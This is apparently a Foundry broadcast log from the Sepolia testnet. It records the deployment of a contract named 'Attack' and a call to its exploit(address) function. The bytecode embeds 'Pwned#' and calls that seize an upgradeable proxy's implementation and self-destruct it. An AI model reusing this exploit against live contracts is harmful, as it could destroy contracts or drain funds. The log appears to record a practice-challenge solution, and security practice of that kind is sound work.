{
  "transactions": [
    {
      "hash": "0x80afeac238ce42f0b922cfd74d087b111a0fd765cbcfa4a8bf0ef5deda5235cc",
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0x1ca7c997a43f8d7b7c17d18ecc807465f719b103",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "gas": "0x57875",
        "value": "0x0",
        "input": "0x608060405234801561001057600080fd5b50610406806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80630aeb4ddf1461003b578063dd365b8b14610063575b600080fd5b6100616004803603602081101561005157600080fd5b50356001600160a01b031661006b565b005b6100616102ab565b600080546001600160a01b0319166001600160a01b03831617905560408051808201909152600f81526e41747461636b20416464726573732360881b60208201526100b690306102d7565b600080546040805163204a7f0760e21b815290516001600160a01b0390921692638129fc1c9260048084019382900301818387803b1580156100f757600080fd5b505af115801561010b573d6000803e3d6000fd5b505050506101b16040518060400160405280600981526020016855706772616465722360b81b81525060008054906101000a90046001600160a01b03166001600160a01b031663af2697456040518163ffffffff1660e01b815260040160206040518083038186803b15801561018057600080fd5b505afa158015610194573d6000803e3d6000fd5b505050506040513d60208110156101aa57600080fd5b50516102d7565b604080516004808252602480830184526020830180516001600160e01b031663dd365b8b60e01b17815260008054865163278f794360e11b81523095810186815294810197885286516044820152865196976001600160a01b0390921696634f1ef2869695899590946064909301929091908190849084905b8381101561024257818101518382015260200161022a565b50505050905090810190601f16801561026f5780820380516001836020036101000a031916815260200191505b509350505050600060405180830381600087803b15801561028f57600080fd5b505af11580156102a3573d6000803e3d6000fd5b505050505050565b6102d36040518060400160405280600681526020016550776e65642360d01b815250306102d7565b6000ff5b61038e82826040516024018080602001836001600160a01b03168152602001828103825284818151815260200191508051906020019080838360005b8381101561032b578181015183820152602001610313565b50505050905090810190601f1680156103585780820380516001836020036101000a031916815260200191505b5060408051601f198184030181529190526020810180516001600160e01b031663319af33360e01b179052935061039292505050565b5050565b6103a9816103a16103ac6103cd565b63ffffffff16565b50565b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b9056fea26469706673582212201ba5c775c86126fbe6e0b0d7d65b3e3ed530319af4b6d6d9f2ea993ccf31541364736f6c634300060c0033",
        "nonce": "0xf9",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x3ca996ba19f3bbf444ef2c45b010830d38b3e81b31d2227d09b87c14e0c255cb",
      "transactionType": "CALL",
      "contractName": "Attack",
      "contractAddress": "0x1ca7c997a43f8d7b7c17d18ecc807465f719b103",
      "function": "exploit(address)",
      "arguments": [
        "0xC07690ec0367501539f7E2E12cCC77cC93412902"
      ],
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "to": "0x1ca7c997a43f8d7b7c17d18ecc807465f719b103",
        "gas": "0x2bf77",
        "value": "0x0",
        "input": "0x0aeb4ddf000000000000000000000000c07690ec0367501539f7e2e12ccc77cc93412902",
        "nonce": "0xfa",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x112c72b",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x80afeac238ce42f0b922cfd74d087b111a0fd765cbcfa4a8bf0ef5deda5235cc",
      "transactionIndex": "0x98",
      "blockHash": "0xbb63c99442e6dcd62bc42125a8121c21a18f0e52b058c378dab1ca33a3cfbd79",
      "blockNumber": "0x6701bf",
      "gasUsed": "0x43547",
      "effectiveGasPrice": "0x5cb8b2254",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": null,
      "contractAddress": "0x1ca7c997a43f8d7b7c17d18ecc807465f719b103"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x114c478",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x3ca996ba19f3bbf444ef2c45b010830d38b3e81b31d2227d09b87c14e0c255cb",
      "transactionIndex": "0x99",
      "blockHash": "0xbb63c99442e6dcd62bc42125a8121c21a18f0e52b058c378dab1ca33a3cfbd79",
      "blockNumber": "0x6701bf",
      "gasUsed": "0x1fd4d",
      "effectiveGasPrice": "0x5cb8b2254",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": "0x1ca7c997a43f8d7b7c17d18ecc807465f719b103",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1727175147,
  "chain": 11155111,
  "commit": "b020e18"
}